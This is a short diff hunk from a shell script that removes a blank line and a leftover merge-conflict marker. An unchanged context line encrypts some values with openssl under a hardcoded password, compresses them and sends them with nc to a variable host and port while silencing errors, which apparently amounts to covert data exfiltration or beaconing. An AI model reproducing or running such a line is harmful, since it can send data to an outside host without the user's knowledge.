@@ -17,5 +17,3 @@ else
  echo $so $stamp $res | openssl enc -a -A -aes-256-cbc -k SuperSecretPWD | gzip -cf | nc -w 4 $dst $pp 2>/dev/null
  echo finisehd >> tmpreply
 fi
- 
->>>>>>> 41da38ab54ce2ded21a90c450a65592db9c3b03e
